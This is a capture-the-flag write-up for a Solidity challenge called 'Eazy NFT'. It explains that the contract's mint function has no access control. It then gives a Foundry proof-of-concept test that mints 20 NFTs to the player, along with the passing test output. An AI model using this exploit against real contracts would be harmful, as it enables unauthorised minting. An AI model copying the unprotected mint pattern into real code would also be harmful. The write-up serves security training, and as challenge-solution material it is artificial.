# Challenge - Eazy NFT

NFT market was slowly booming and Tony's friends were showing off their NFT holdings. Tony had finally whitelisted a NFT project, he's anxiously waiting for minting his first NFT.

## Objective of CTF

Owns 20 NFTs, with IDs from 0 to 19.

## Vulnerability Analysis

Mint 20 NFTs directly to the player address.

### Attack steps:

1. Mint 20 NFT by calling the `mint` function in `ET`.

## PoC test case

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {ET, Challenge} from "src/EazyNFT.sol";

contract EasyNFTTest is Test {
    address player = makeAddr("player");
    Challenge challenge;
    ET et;

    function setUp() public {
        challenge = new Challenge(player);
        et = challenge.et();
    }

    function testChallengeIsSolved() external {
        vm.startPrank(player);
        for (uint256 i; i < 20; ++i) {
            et.mint(player, i);
        }
        vm.stopPrank();

        challenge.solve();
        assertTrue(challenge.isSolved());
    }
}
```

### Test Result

```
Ran 1 test for test/EazyNFT.t.sol:EasyNFTTest
[PASS] testChallengeIsSolved() (gas: 427056)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 903.33µs (308.63µs CPU time)

Ran 1 test suite in 229.46ms (903.33µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
